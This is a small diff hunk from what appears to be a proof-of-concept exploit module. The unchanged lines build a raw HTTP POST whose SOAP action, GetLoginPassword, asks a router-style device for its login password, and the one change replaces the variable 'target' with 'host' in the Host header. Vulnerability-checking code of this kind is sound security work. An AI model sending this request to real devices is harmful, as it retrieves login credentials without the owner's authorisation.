@@ -57,7 +57,7 @@ class Poc(ABPoc):
             message = "POST /UD/?5 HTTP/1.1\r\n"
             message += "SOAPACTION: \"urn:dslforum-org:service:UserInterface:1#GetLoginPassword\"\r\n"
             message += "Content-Type: text/xml; charset=\"utf-8\"\r\n"
-            message += "Host:" + target + "\r\n"
+            message += "Host:" + host + "\r\n"
             message += "Content-Length:" + str(len(soap)) +"\r\n"
             message += "Expect: 100-continue\r\n"
             message += "Connection: Keep-Alive\r\n\r\n"
